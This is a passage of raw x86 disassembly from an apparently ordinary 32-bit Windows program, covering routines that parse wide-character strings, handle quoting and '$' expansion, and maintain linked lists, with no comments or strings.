  402c01:	cmp    WORD PTR [eax],dx
  402c04:	jne    0x402c5f
  402c06:	mov    eax,DWORD PTR [esp+0x14]
  402c0a:	lea    ecx,[esp+0x20]
  402c0e:	mov    DWORD PTR [esp+0x20],eax
  402c12:	call   0x402cad
  402c17:	mov    DWORD PTR [esp+0x2c],eax
  402c1b:	test   eax,eax
  402c1d:	je     0x402c59
  402c1f:	mov    esi,eax
  402c21:	call   0x40dcc8
  402c26:	mov    edi,eax
  402c28:	mov    ecx,esi
  402c2a:	mov    DWORD PTR [esp+0x18],edi
  402c2e:	call   0x40dd18
  402c33:	mov    ecx,DWORD PTR [esp+0x10]
  402c37:	mov    DWORD PTR [edi+0x4],eax
  402c3a:	mov    eax,DWORD PTR [ecx]
  402c3c:	mov    DWORD PTR [edi],eax
  402c3e:	mov    DWORD PTR [ecx],edi
  402c40:	test   ebx,ebx
  402c42:	jne    0x402c46
  402c44:	mov    ebx,edi
  402c46:	lea    ecx,[esp+0x20]
  402c4a:	call   0x402cad
  402c4f:	mov    esi,eax
  402c51:	test   esi,esi
  402c53:	jne    0x402c21
  402c55:	mov    esi,DWORD PTR [esp+0x24]
  402c59:	push   DWORD PTR [esp+0x14]
  402c5d:	jmp    0x402c8b
  402c5f:	test   edi,edi
  402c61:	je     0x402c87
  402c63:	test   ebx,ebx
  402c65:	jne    0x402c75
  402c67:	mov    eax,DWORD PTR [edi]
  402c69:	mov    ebx,edi
  402c6b:	jmp    0x402c71
  402c6d:	mov    ebx,eax
  402c6f:	mov    eax,DWORD PTR [ebx]
  402c71:	test   eax,eax
  402c73:	jne    0x402c6d
  402c75:	mov    edx,DWORD PTR [ecx]
  402c77:	lea    eax,[edi]
  402c79:	mov    edi,DWORD PTR [eax]
  402c7b:	test   edi,edi
  402c7d:	jne    0x402c77
  402c7f:	mov    DWORD PTR [eax],edx
  402c81:	mov    edi,DWORD PTR [esp+0x18]
  402c85:	mov    DWORD PTR [ecx],edi
  402c87:	push   DWORD PTR [esp+0x28]
  402c8b:	call   DWORD PTR ds:0x43754c
  402c91:	pop    ecx
  402c92:	jmp    0x402c98
  402c94:	mov    ebx,esi
  402c96:	mov    esi,DWORD PTR [esi]
  402c98:	mov    edx,DWORD PTR [esp+0x1c]
  402c9c:	test   esi,esi
  402c9e:	jne    0x402b60
  402ca4:	pop    edi
  402ca5:	pop    esi
  402ca6:	pop    ebx
  402ca7:	mov    esp,ebp
  402ca9:	pop    ebp
  402caa:	ret    0x4
  402cad:	push   ebp
  402cae:	mov    ebp,esp
  402cb0:	push   ecx
  402cb1:	push   ecx
  402cb2:	push   ebx
  402cb3:	push   esi
  402cb4:	push   edi
  402cb5:	push   0x20
  402cb7:	pop    ebx
  402cb8:	push   0x9
  402cba:	pop    esi
  402cbb:	mov    edx,ecx
  402cbd:	push   0x2
  402cbf:	mov    ecx,DWORD PTR [edx]
  402cc1:	mov    DWORD PTR [ebp-0x8],esi
  402cc4:	pop    edi
  402cc5:	movzx  eax,WORD PTR [ecx]
  402cc8:	cmp    ax,bx
  402ccb:	je     0x402cd2
  402ccd:	cmp    ax,si
  402cd0:	jne    0x402cd6
  402cd2:	add    ecx,edi
  402cd4:	jmp    0x402cc5
  402cd6:	movzx  eax,WORD PTR [ecx]
  402cd9:	mov    esi,ecx
  402cdb:	test   ax,ax
  402cde:	jne    0x402ce4
  402ce0:	xor    eax,eax
  402ce2:	jmp    0x402d42
  402ce4:	mov    DWORD PTR [ebp-0x4],0x22
  402ceb:	cmp    ax,WORD PTR [ebp-0x4]
  402cef:	jne    0x402d03
  402cf1:	add    ecx,edi
  402cf3:	movzx  eax,WORD PTR [ecx]
  402cf6:	test   ax,ax
  402cf9:	je     0x402d18
  402cfb:	cmp    ax,WORD PTR [ebp-0x4]
  402cff:	jne    0x402cf1
  402d01:	jmp    0x402d18
  402d03:	cmp    ax,bx
  402d06:	je     0x402d36
  402d08:	cmp    ax,WORD PTR [ebp-0x8]
  402d0c:	je     0x402d18
  402d0e:	add    ecx,edi
  402d10:	movzx  eax,WORD PTR [ecx]
  402d13:	test   ax,ax
  402d16:	jne    0x402d03
  402d18:	movzx  eax,WORD PTR [ecx]
  402d1b:	cmp    ax,bx
  402d1e:	je     0x402d36
  402d20:	push   0x9
  402d22:	pop    ebx
  402d23:	cmp    ax,bx
  402d26:	je     0x402d36
  402d28:	cmp    ax,WORD PTR [ebp-0x4]
  402d2c:	jne    0x402d47
  402d2e:	add    ecx,edi
  402d30:	cmp    WORD PTR [ecx],0x0
  402d34:	je     0x402d4c
  402d36:	xor    eax,eax
  402d38:	mov    WORD PTR [ecx],ax
  402d3b:	add    ecx,0x2
  402d3e:	mov    DWORD PTR [edx],ecx
  402d40:	mov    eax,esi
  402d42:	pop    edi
  402d43:	pop    esi
  402d44:	pop    ebx
  402d45:	leave  
  402d46:	ret    
  402d47:	test   ax,ax
  402d4a:	jne    0x402d3b
  402d4c:	sub    ecx,edi
  402d4e:	jmp    0x402d3b
  402d50:	push   ebx
  402d51:	mov    bl,BYTE PTR ds:0x4216e4
  402d57:	xor    eax,eax
  402d59:	push   esi
  402d5a:	test   bl,bl
  402d5c:	jns    0x402d67
  402d5e:	and    bl,0x7f
  402d61:	mov    BYTE PTR ds:0x4216e4,bl
  402d67:	test   bl,0x10
  402d6a:	je     0x402d8f
  402d6c:	cmp    DWORD PTR ds:0x4216d8,eax
  402d72:	je     0x402e6b
  402d78:	push   0x43e
  402d7d:	push   DWORD PTR ds:0x4216e0
  402d83:	call   0x405021
  402d88:	pop    ecx
  402d89:	pop    ecx
  402d8a:	jmp    0x402e65
  402d8f:	mov    cl,bl
  402d91:	and    cl,0x2
  402d94:	jne    0x402e34
  402d9a:	test   bl,0x4
  402d9d:	jne    0x402e34
  402da3:	test   bl,0x1
  402da6:	je     0x402dfb
  402da8:	cmp    DWORD PTR ds:0x4216d8,eax
  402dae:	jne    0x402def
  402db0:	mov    eax,ds:0x4216d0
  402db5:	mov    esi,eax
  402db7:	test   esi,esi
  402db9:	je     0x402e6b
  402dbf:	push   edi
  402dc0:	mov    edi,DWORD PTR ds:0x43265c
  402dc6:	mov    eax,DWORD PTR [eax]
  402dc8:	mov    ds:0x4216d0,eax
  402dcd:	push   DWORD PTR [esi+0x4]
  402dd0:	call   DWORD PTR ds:0x43754c
  402dd6:	mov    DWORD PTR [esi],edi
  402dd8:	mov    eax,ds:0x4216d0
  402ddd:	mov    edi,esi
  402ddf:	mov    esi,eax
  402de1:	pop    ecx
  402de2:	test   esi,esi
  402de4:	jne    0x402dc6
  402de6:	mov    DWORD PTR ds:0x43265c,edi
  402dec:	pop    edi
  402ded:	jmp    0x402e6b
  402def:	mov    ecx,0x4216d0
  402df4:	call   0x403424
  402df9:	jmp    0x402e65
  402dfb:	test   bl,0x8
  402dfe:	je     0x402e0f
  402e00:	cmp    DWORD PTR ds:0x4216d8,eax
  402e06:	je     0x402e6b
  402e08:	mov    ecx,0x4216cc
  402e0d:	jmp    0x402df4
  402e0f:	push   0x20
  402e11:	pop    ecx
  402e12:	call   0x40a320
  402e17:	mov    ecx,DWORD PTR ds:0x4216d8
  402e1d:	mov    ds:0x4216c8,eax
  402e22:	mov    DWORD PTR [eax],ecx
  402e24:	mov    ecx,DWORD PTR ds:0x4216c8
  402e2a:	mov    eax,ds:0x4216ec
  402e2f:	mov    DWORD PTR [ecx+0x4],eax
  402e32:	jmp    0x402e65
  402e34:	cmp    DWORD PTR ds:0x4216d8,eax
  402e3a:	je     0x402e6b
  402e3c:	test   cl,cl
  402e3e:	je     0x402e47
  402e40:	mov    eax,0x4011a4
  402e45:	jmp    0x402e51
  402e47:	test   bl,0x4
  402e4a:	je     0x402e51
  402e4c:	mov    eax,0x401194
  402e51:	push   eax
  402e52:	push   0x442
  402e57:	push   DWORD PTR ds:0x4216e0
  402e5d:	call   0x405021
  402e62:	add    esp,0xc
  402e65:	mov    bl,BYTE PTR ds:0x4216e4
  402e6b:	and    DWORD PTR ds:0x4216d8,0x0
  402e72:	and    DWORD PTR ds:0x4216ec,0x0
  402e79:	or     bl,0x40
  402e7c:	pop    esi
  402e7d:	mov    BYTE PTR ds:0x4216e4,bl
  402e83:	pop    ebx
  402e84:	ret    
  402e85:	push   ebp
  402e86:	mov    ebp,esp
  402e88:	push   ecx
  402e89:	mov    cl,BYTE PTR ds:0x4216e4
  402e8f:	push   ebx
  402e90:	xor    ebx,ebx
  402e92:	inc    ebx
  402e93:	xor    eax,eax
  402e95:	push   esi
  402e96:	mov    BYTE PTR [ebp-0x1],bl
  402e99:	test   cl,0x10
  402e9c:	je     0x402eb1
  402e9e:	mov    ecx,DWORD PTR ds:0x4216c4
  402ea4:	mov    eax,ds:0x4216d8
  402ea9:	mov    DWORD PTR [ecx+0xc],eax
  402eac:	jmp    0x402fa0
  402eb1:	mov    dl,cl
  402eb3:	and    dl,0x2
  402eb6:	jne    0x402f57
  402ebc:	test   cl,0xd
  402ebf:	jne    0x402f57
  402ec5:	mov    ecx,DWORD PTR ds:0x4216c8
  402ecb:	mov    eax,ds:0x4216d8
  402ed0:	mov    esi,DWORD PTR ds:0x4114b0
  402ed6:	mov    DWORD PTR [ecx+0x8],eax
  402ed9:	mov    ecx,DWORD PTR ds:0x4216c8
  402edf:	mov    eax,ds:0x4216ec
  402ee4:	mov    DWORD PTR [ecx+0xc],eax
  402ee7:	mov    ecx,DWORD PTR ds:0x4216c8
  402eed:	mov    al,ds:0x4114bf
  402ef2:	mov    BYTE PTR [ecx+0x10],al
  402ef5:	jmp    0x402f51
  402ef7:	mov    ecx,DWORD PTR [esi+0x4]
  402efa:	call   0x402a53
  402eff:	test   al,al
  402f01:	je     0x402f15
  402f03:	push   0x445
  402f08:	push   DWORD PTR ds:0x4216e0
  402f0e:	call   0x405021
  402f13:	pop    ecx
  402f14:	pop    ecx
  402f15:	mov    dl,BYTE PTR [ebp-0x1]
  402f18:	push   ecx
  402f19:	mov    ecx,DWORD PTR [esi+0x4]
  402f1c:	call   0x40335e
  402f21:	cmp    DWORD PTR ds:0x4216c0,0x0
  402f28:	jne    0x402f32
  402f2a:	mov    DWORD PTR ds:0x4216c0,esi
  402f30:	xor    bl,bl
  402f32:	mov    ecx,DWORD PTR [esi]
  402f34:	mov    DWORD PTR ds:0x4114b0,ecx
  402f3a:	test   bl,bl
  402f3c:	je     0x402f4b
  402f3e:	mov    eax,ds:0x43265c
  402f43:	mov    DWORD PTR [esi],eax
  402f45:	mov    DWORD PTR ds:0x43265c,esi
  402f4b:	mov    BYTE PTR [ebp-0x1],0x0
  402f4f:	mov    esi,ecx
  402f51:	test   esi,esi
  402f53:	jne    0x402ef7
  402f55:	jmp    0x402fa0
  402f57:	cmp    DWORD PTR ds:0x4216d8,eax
  402f5d:	je     0x402fa0
  402f5f:	test   dl,dl
  402f61:	je     0x402f6a
  402f63:	mov    eax,0x4011a4
  402f68:	jmp    0x402f8c
  402f6a:	test   cl,0x4
  402f6d:	je     0x402f76
  402f6f:	mov    eax,0x401194
  402f74:	jmp    0x402f8c
  402f76:	test   cl,0x8
  402f79:	je     0x402f82
  402f7b:	mov    eax,0x40116c
  402f80:	jmp    0x402f8c
  402f82:	test   cl,0x1
  402f85:	je     0x402f8c
  402f87:	mov    eax,0x401180
  402f8c:	push   eax
  402f8d:	push   0x441
  402f92:	push   DWORD PTR ds:0x4216e0
  402f98:	call   0x405021
  402f9d:	add    esp,0xc
  402fa0:	xor    ecx,ecx
  402fa2:	pop    esi
  402fa3:	mov    DWORD PTR ds:0x4114b0,ecx
  402fa9:	mov    DWORD PTR ds:0x4216d8,ecx
  402faf:	mov    DWORD PTR ds:0x4216ec,ecx
  402fb5:	mov    DWORD PTR ds:0x4216c8,ecx
  402fbb:	mov    BYTE PTR ds:0x4216e4,cl
  402fc1:	pop    ebx
  402fc2:	leave  
  402fc3:	ret    
  402fc4:	push   ebx
  402fc5:	push   esi
  402fc6:	push   edi
  402fc7:	push   0x24
  402fc9:	push   DWORD PTR ds:0x4216e8
  402fcf:	call   DWORD PTR ds:0x437540
  402fd5:	mov    edi,DWORD PTR ds:0x43754c
  402fdb:	pop    ecx
  402fdc:	xor    ebx,ebx
  402fde:	pop    ecx
  402fdf:	test   eax,eax
  402fe1:	je     0x403050
  402fe3:	mov    ecx,DWORD PTR ds:0x4216e8
  402fe9:	mov    esi,DWORD PTR ds:0x4216ec
  402fef:	push   0x4216ec
  402ff4:	or     dl,0xff
  402ff7:	call   0x40e68f
  402ffc:	mov    ebx,eax
  402ffe:	xor    eax,eax
  403000:	cmp    WORD PTR [ebx],ax
  403003:	jne    0x403017
  403005:	push   0x3ec
  40300a:	push   DWORD PTR ds:0x4216e0
  403010:	call   0x405021
  403015:	pop    ecx
  403016:	pop    ecx
  403017:	mov    eax,esi
  403019:	mov    ds:0x4216ec,eax
  40301e:	test   esi,esi
  403020:	je     0x40303f
  403022:	mov    ecx,DWORD PTR ds:0x43265c
  403028:	mov    esi,DWORD PTR [esi]
  40302a:	mov    DWORD PTR [eax],ecx
  40302c:	mov    ecx,eax
  40302e:	mov    eax,esi
  403030:	mov    ds:0x4216ec,eax
  403035:	test   esi,esi
  403037:	jne    0x403028
  403039:	mov    DWORD PTR ds:0x43265c,ecx
  40303f:	push   DWORD PTR ds:0x4216e8
  403045:	call   edi
  403047:	mov    DWORD PTR ds:0x4216e8,ebx
  40304d:	pop    ecx
  40304e:	xor    ebx,ebx
  403050:	mov    esi,DWORD PTR ds:0x4216e8
  403056:	movzx  eax,WORD PTR [esi]
  403059:	test   ax,ax
  40305c:	je     0x403090
  40305e:	mov    ecx,eax
  403060:	call   0x40358a
  403065:	test   al,al
  403067:	je     0x403074
  403069:	add    esi,0x2
  40306c:	movzx  eax,WORD PTR [esi]
  40306f:	test   ax,ax
  403072:	jne    0x40305e
  403074:	movzx  eax,WORD PTR [esi]
  403077:	test   ax,ax
  40307a:	je     0x403090
  40307c:	push   eax
  40307d:	push   0x3e9
  403082:	push   DWORD PTR ds:0x4216e0
  403088:	call   0x405021
  40308d:	add    esp,0xc
  403090:	mov    edx,DWORD PTR ds:0x4216dc
  403096:	mov    ecx,DWORD PTR ds:0x4216e8
  40309c:	push   ebx
  40309d:	mov    BYTE PTR ds:0x4114bd,0x1
  4030a4:	call   0x4031f5
  4030a9:	test   al,al
  4030ab:	jne    0x4030bf
  4030ad:	push   DWORD PTR ds:0x4216e8
  4030b3:	call   edi
  4030b5:	push   DWORD PTR ds:0x4216dc
  4030bb:	call   edi
  4030bd:	pop    ecx
  4030be:	pop    ecx
  4030bf:	pop    edi
  4030c0:	pop    esi
  4030c1:	mov    DWORD PTR ds:0x4216dc,ebx
  4030c7:	mov    DWORD PTR ds:0x4216e8,ebx
  4030cd:	pop    ebx
  4030ce:	ret    
  4030cf:	push   ebp
  4030d0:	mov    ebp,esp
  4030d2:	sub    esp,0x10
  4030d5:	push   ebx
  4030d6:	push   esi
  4030d7:	mov    ebx,ecx
  4030d9:	xor    eax,eax
  4030db:	push   edi
  4030dc:	mov    edi,edx
  4030de:	mov    DWORD PTR [ebp-0x8],edi
  4030e1:	mov    DWORD PTR [ebp-0x4],ebx
  4030e4:	mov    esi,ebx
  4030e6:	mov    DWORD PTR [ebp-0xc],eax
  4030e9:	cmp    WORD PTR [ebx],ax
  4030ec:	je     0x40310c
  4030ee:	push   0x2
  4030f0:	pop    edi
  4030f1:	xor    ebx,ebx
  4030f3:	mov    cx,WORD PTR [esi]
  4030f6:	call   0x40358a
  4030fb:	test   al,al
  4030fd:	je     0x403106
  4030ff:	add    esi,edi
  403101:	cmp    WORD PTR [esi],bx
  403104:	jne    0x4030f3
  403106:	mov    edi,DWORD PTR [ebp-0x8]
  403109:	mov    ebx,DWORD PTR [ebp-0x4]
  40310c:	movzx  eax,WORD PTR [esi]
  40310f:	test   ax,ax
  403112:	je     0x403135
  403114:	test   BYTE PTR [ebp+0x8],0x4
  403118:	je     0x403121
  40311a:	xor    al,al
  40311c:	jmp    0x4031ee
  403121:	push   eax
  403122:	push   0x3e9
  403127:	push   DWORD PTR ds:0x4216e0
  40312d:	call   0x405021
  403132:	add    esp,0xc
  403135:	test   BYTE PTR [ebp+0x8],0x40
  403139:	je     0x4031e2
  40313f:	xor    eax,eax
  403141:	push   0x24
  403143:	mov    esi,eax
  403145:	pop    eax
  403146:	push   eax
  403147:	push   edi
  403148:	call   DWORD PTR ds:0x437540
  40314e:	pop    ecx
  40314f:	pop    ecx
  403150:	test   eax,eax
  403152:	je     0x4031e2
  403158:	push   0x24
  40315a:	pop    ebx
  40315b:	add    eax,0x2
  40315e:	push   ebx
  40315f:	push   eax
  403160:	inc    esi
  403161:	call   DWORD PTR ds:0x437540
  403167:	pop    ecx
  403168:	pop    ecx
  403169:	test   eax,eax
  40316b:	jne    0x40315b
  40316d:	mov    ebx,DWORD PTR [ebp-0x4]
  403170:	test   esi,esi
  403172:	je     0x4031e2
  403174:	mov    ecx,edi
  403176:	lea    edx,[ecx+0x2]
  403179:	mov    ax,WORD PTR [ecx]
  40317c:	add    ecx,0x2
  40317f:	cmp    ax,WORD PTR [ebp-0xc]
  403183:	jne    0x403179
  403185:	sub    ecx,edx
  403187:	sar    ecx,1
  403189:	push   0x2
  40318b:	lea    eax,[esi+0x1]
  40318e:	add    eax,ecx
  403190:	xor    ecx,ecx
  403192:	pop    edx
  403193:	mul    edx
  403195:	seto   cl
  403198:	neg    ecx
  40319a:	or     ecx,eax
  40319c:	call   0x40a2fb
  4031a1:	movzx  edx,WORD PTR [edi]
  4031a4:	mov    DWORD PTR [ebp-0xc],eax
  4031a7:	mov    esi,edi
  4031a9:	mov    ecx,eax
  4031ab:	test   dx,dx
  4031ae:	je     0x4031d2
  4031b0:	push   0x2
  4031b2:	pop    eax
  4031b3:	push   0x24
  4031b5:	pop    ebx
  4031b6:	mov    WORD PTR [ecx],dx
  4031b9:	add    esi,eax
  4031bb:	add    ecx,eax
  4031bd:	cmp    dx,bx
  4031c0:	jne    0x4031c7
  4031c2:	mov    WORD PTR [ecx],bx
  4031c5:	add    ecx,eax
  4031c7:	movzx  edx,WORD PTR [esi]
  4031ca:	test   dx,dx
  4031cd:	jne    0x4031b6
  4031cf:	mov    ebx,DWORD PTR [ebp-0x4]
  4031d2:	xor    eax,eax
  4031d4:	push   edi
  4031d5:	mov    WORD PTR [ecx],ax
  4031d8:	call   DWORD PTR ds:0x43754c
  4031de:	mov    edi,DWORD PTR [ebp-0xc]
  4031e1:	pop    ecx
  4031e2:	push   DWORD PTR [ebp+0x8]
  4031e5:	mov    edx,edi
  4031e7:	mov    ecx,ebx
  4031e9:	call   0x4031f5
  4031ee:	pop    edi
  4031ef:	pop    esi
  4031f0:	pop    ebx
  4031f1:	leave  
  4031f2:	ret    0x4
  4031f5:	push   ebp
  4031f6:	mov    ebp,esp
  4031f8:	sub    esp,0x10
  4031fb:	push   ebx
  4031fc:	xor    eax,eax
  4031fe:	test   BYTE PTR [ebp+0x8],0x2
  403202:	push   esi
  403203:	push   edi
  403204:	mov    ebx,edx
  403206:	mov    edi,ecx
  403208:	mov    BYTE PTR [ebp-0x1],al
  40320b:	mov    DWORD PTR [ebp-0x8],eax
  40320e:	je     0x40328b
  403210:	cmp    WORD PTR [ebx],ax
  403213:	je     0x40323e
  403215:	mov    ecx,ebx
  403217:	call   0x40e627
  40321c:	push   eax
  40321d:	push   edi
  40321e:	call   DWORD PTR ds:0x4373cc
  403224:	pop    ecx
  403225:	pop    ecx
  403226:	test   eax,eax
  403228:	je     0x40323c
  40322a:	push   0x41f
  40322f:	push   DWORD PTR ds:0x4216e0
  403235:	call   0x405021
  40323a:	pop    ecx
  40323b:	pop    ecx
  40323c:	xor    eax,eax
  40323e:	mov    ecx,edi
  403240:	mov    ds:0x4114bd,al
  403245:	call   0x40a26b
  40324a:	mov    esi,eax
  40324c:	test   esi,esi
  40324e:	je     0x403268
  403250:	mov    al,BYTE PTR [esi+0xc]
  403253:	test   al,0x2
  403255:	jne    0x4032e0
  40325b:	test   BYTE PTR ds:0x4114bc,0x4
  403262:	je     0x403268
  403264:	test   al,0x4
  403266:	jne    0x4032e0
  403268:	call   0x40dcc8
  40326d:	mov    ecx,eax
  40326f:	mov    DWORD PTR [ebp-0xc],ecx
  403272:	mov    DWORD PTR [ecx+0x4],ebx
  403275:	test   esi,esi
  403277:	jne    0x4032e4
  403279:	push   0x10
  40327b:	pop    ecx
  40327c:	call   0x40a320
  403281:	mov    ecx,DWORD PTR [ebp-0xc]
  403284:	mov    esi,eax
  403286:	mov    DWORD PTR [esi+0x4],edi
  403289:	jmp    0x4032e8
  40328b:	cmp    BYTE PTR ds:0x4114bd,al
  403291:	je     0x40323e
  403293:	test   BYTE PTR ds:0x4114bc,0x4
  40329a:	jne    0x40323e
  40329c:	push   edi
  40329d:	push   eax
  40329e:	push   eax
  40329f:	lea    eax,[ebp-0x8]
  4032a2:	push   eax
  4032a3:	call   DWORD PTR ds:0x437418
  4032a9:	add    esp,0x10
  4032ac:	test   eax,eax
  4032ae:	jne    0x40323c
  4032b0:	cmp    DWORD PTR [ebp-0x8],eax
  4032b3:	jbe    0x40323c
  4032b5:	mov    ecx,edi
  4032b7:	call   0x40a26b
  4032bc:	test   eax,eax
  4032be:	je     0x403215
  4032c4:	mov    al,BYTE PTR [eax+0xc]
  4032c7:	test   al,0x2
  4032c9:	jne    0x4032e0
  4032cb:	test   BYTE PTR ds:0x4114bc,0x4
  4032d2:	je     0x403215
  4032d8:	test   al,0x4
  4032da:	je     0x403215
  4032e0:	xor    al,al
  4032e2:	jmp    0x403357
  4032e4:	mov    BYTE PTR [ebp-0x1],0x1
  4032e8:	mov    al,BYTE PTR [esi+0xc]
  4032eb:	and    al,0xef
  4032ed:	or     al,BYTE PTR [ebp+0x8]
  4032f0:	cmp    BYTE PTR [ebp-0x1],0x0
  4032f4:	mov    BYTE PTR [esi+0xc],al
  4032f7:	mov    eax,DWORD PTR [esi+0x8]
  4032fa:	mov    DWORD PTR [ecx],eax
  4032fc:	mov    DWORD PTR [esi+0x8],ecx
  4032ff:	jne    0x403314
  403301:	mov    ecx,DWORD PTR ds:0x43242c
  403307:	and    DWORD PTR ds:0x43242c,0x0
  40330e:	mov    eax,DWORD PTR [ecx]
  403310:	mov    DWORD PTR [esi],eax
  403312:	mov    DWORD PTR [ecx],esi
  403314:	test   BYTE PTR [ebp+0x8],0x40
  403318:	jne    0x403355
  40331a:	push   0x24
  40331c:	push   ebx
  40331d:	call   DWORD PTR ds:0x437540
  403323:	pop    ecx
  403324:	pop    ecx
  403325:	test   eax,eax
  403327:	je     0x403355
  403329:	push   DWORD PTR [ebp+0x8]
  40332c:	or     BYTE PTR [esi+0xc],0x1
  403330:	xor    eax,eax
  403332:	push   eax
  403333:	push   0x1
  403335:	push   edi
  403336:	push   eax
  403337:	xor    edx,edx
  403339:	mov    ecx,ebx
  40333b:	call   0x40dfe5
  403340:	and    BYTE PTR [esi+0xc],0xfe
  403344:	mov    cl,BYTE PTR [esi+0xc]
  403347:	test   al,al
  403349:	jne    0x403355
  40334b:	and    DWORD PTR [esi+0x8],0x0
  40334f:	or     cl,0x10
  403352:	mov    BYTE PTR [esi+0xc],cl
  403355:	mov    al,0x1
  403357:	pop    edi
  403358:	pop    esi
  403359:	pop    ebx
  40335a:	leave  
  40335b:	ret    0x4
  40335e:	push   ebp
  40335f:	mov    ebp,esp
  403361:	push   ecx
  403362:	mov    eax,ds:0x4216c8
  403367:	push   ebx
  403368:	push   esi
  403369:	push   edi
  40336a:	mov    BYTE PTR [ebp-0x1],dl
  40336d:	mov    ebx,ecx
  40336f:	test   eax,eax
  403371:	jne    0x403380
  403373:	push   0x20
  403375:	pop    ecx
  403376:	call   0x40a320
  40337b:	mov    ds:0x4216c8,eax
  403380:	cmp    BYTE PTR [ebp-0x1],0x0
  403384:	je     0x40339b
  403386:	push   0x8
  403388:	pop    ecx
  403389:	call   0x40a320
  40338e:	mov    ecx,DWORD PTR ds:0x4216c8
  403394:	mov    edi,eax
  403396:	mov    DWORD PTR [edi+0x4],ecx
  403399:	jmp    0x4033a4
  40339b:	mov    ecx,eax
  40339d:	call   0x403540
  4033a2:	mov    edi,eax
  4033a4:	push   ecx
  4033a5:	push   ecx
  4033a6:	mov    ecx,ebx
  4033a8:	call   0x40de55
  4033ad:	mov    esi,eax
  4033af:	test   esi,esi
  4033b1:	je     0x4033ec
  4033b3:	mov    cl,BYTE PTR [esi+0x8]
  4033b6:	xor    cl,BYTE PTR ds:0x4114bf
  4033bc:	test   cl,0x20
  4033bf:	je     0x4033d3
  4033c1:	push   0x43f
  4033c6:	push   DWORD PTR ds:0x4216e0
  4033cc:	call   0x405021
  4033d1:	pop    ecx
  4033d2:	pop    ecx
  4033d3:	lea    eax,[esi+0x18]
  4033d6:	jmp    0x4033da
  4033d8:	mov    eax,ecx
  4033da:	mov    ecx,DWORD PTR [eax]
  4033dc:	test   ecx,ecx
  4033de:	jne    0x4033d8
  4033e0:	push   ebx
  4033e1:	mov    DWORD PTR [eax],edi
  4033e3:	call   DWORD PTR ds:0x43754c
  4033e9:	pop    ecx
  4033ea:	jmp    0x40341d
  4033ec:	and    DWORD PTR [edi],0x0
  4033ef:	push   0x20
  4033f1:	pop    ecx
  4033f2:	call   0x40a320
  4033f7:	mov    cl,BYTE PTR ds:0x4114bf
  4033fd:	mov    esi,eax
  4033ff:	mov    BYTE PTR [esi+0x8],cl
  403402:	mov    DWORD PTR [esi+0x4],ebx
  403405:	mov    DWORD PTR [esi+0x18],edi
  403408:	push   ecx
  403409:	mov    ecx,ebx
  40340b:	call   0x40de1d
  403410:	lea    ecx,[eax*4+0x4214c0]
  403417:	mov    eax,DWORD PTR [ecx]
  403419:	mov    DWORD PTR [esi],eax
  40341b:	mov    DWORD PTR [ecx],esi
  40341d:	pop    edi
  40341e:	pop    esi
  40341f:	pop    ebx
  403420:	leave  
  403421:	ret    0x4
  403424:	push   ebp
  403425:	mov    ebp,esp
  403427:	sub    esp,0x14
  40342a:	push   ebx
  40342b:	push   esi
  40342c:	mov    esi,DWORD PTR ds:0x4216d8
  403432:	push   edi
  403433:	mov    ebx,ecx
  403435:	mov    edi,esi
  403437:	mov    DWORD PTR [ebp-0x8],ebx
  40343a:	mov    DWORD PTR [ebp-0xc],edi
  40343d:	jmp    0x403533
  403442:	push   0x24
  403444:	push   DWORD PTR [esi+0x4]
  403447:	call   DWORD PTR ds:0x437540
  40344d:	pop    ecx
  40344e:	pop    ecx
  40344f:	test   eax,eax
  403451:	jne    0x40346c
  403453:	mov    esi,DWORD PTR [esi]
  403455:	and    DWORD PTR [edi],eax
  403457:	mov    eax,DWORD PTR [ebx]
  403459:	mov    ecx,ebx
  40345b:	jmp    0x403461
  40345d:	mov    ecx,eax
  40345f:	mov    eax,DWORD PTR [ecx]
  403461:	test   eax,eax
  403463:	jne    0x40345d
  403465:	mov    DWORD PTR [ecx],edi
  403467:	jmp    0x40352e
  40346c:	mov    ecx,DWORD PTR [esi+0x4]
  40346f:	mov    ebx,DWORD PTR ds:0x4216ec
  403475:	push   0x4216ec
  40347a:	or     dl,0xff
  40347d:	call   0x40e68f
  403482:	mov    DWORD PTR [ebp-0x14],eax
  403485:	cmp    ebx,DWORD PTR ds:0x4216ec
  40348b:	je     0x4034a9
  40348d:	mov    edx,DWORD PTR ds:0x43265c
  403493:	mov    ecx,DWORD PTR [ebx]
  403495:	mov    DWORD PTR [ebx],edx
  403497:	mov    edx,ebx
  403499:	mov    ebx,ecx
  40349b:	cmp    ecx,DWORD PTR ds:0x4216ec
  4034a1:	jne    0x403493
  4034a3:	mov    DWORD PTR ds:0x43265c,edx
  4034a9:	and    DWORD PTR [ebp-0x4],0x0
  4034ad:	lea    ecx,[ebp-0x4]
  4034b0:	push   ecx
  4034b1:	push   0x401090
  4034b6:	push   eax
  4034b7:	call   DWORD PTR ds:0x4373c8
  4034bd:	mov    ebx,eax
  4034bf:	add    esp,0xc
  4034c2:	test   ebx,ebx
  4034c4:	je     0x40350a
  4034c6:	mov    edi,DWORD PTR [ebp-0x8]
  4034c9:	call   0x40dcc8
  4034ce:	mov    ecx,ebx
  4034d0:	mov    DWORD PTR [ebp-0x10],eax
  4034d3:	call   0x40dd18
  4034d8:	mov    ebx,DWORD PTR [ebp-0x10]
  4034db:	mov    edx,edi
  4034dd:	mov    DWORD PTR [ebx+0x4],eax
  4034e0:	mov    ecx,DWORD PTR [edi]
  4034e2:	jmp    0x4034e8
  4034e4:	mov    edx,ecx
  4034e6:	mov    ecx,DWORD PTR [edx]
  4034e8:	test   ecx,ecx
  4034ea:	jne    0x4034e4
  4034ec:	lea    eax,[ebp-0x4]
  4034ef:	push   eax
  4034f0:	push   0x401090
  4034f5:	push   ecx
  4034f6:	mov    DWORD PTR [edx],ebx
  4034f8:	call   DWORD PTR ds:0x4373c8
  4034fe:	mov    ebx,eax
  403500:	add    esp,0xc
  403503:	test   ebx,ebx
  403505:	jne    0x4034c9
  403507:	mov    edi,DWORD PTR [ebp-0xc]
  40350a:	push   DWORD PTR [ebp-0x14]
  40350d:	mov    ebx,DWORD PTR ds:0x43754c
  403513:	call   ebx
  403515:	push   DWORD PTR [esi+0x4]
  403518:	call   ebx
  40351a:	mov    eax,ds:0x43265c
  40351f:	mov    esi,DWORD PTR [esi]
  403521:	mov    ebx,DWORD PTR [ebp-0x8]
  403524:	pop    ecx
  403525:	pop    ecx
  403526:	mov    DWORD PTR [edi],eax
  403528:	mov    DWORD PTR ds:0x43265c,edi
  40352e:	mov    edi,esi
  403530:	mov    DWORD PTR [ebp-0xc],esi
  403533:	test   esi,esi
  403535:	jne    0x403442
  40353b:	pop    edi
  40353c:	pop    esi
  40353d:	pop    ebx
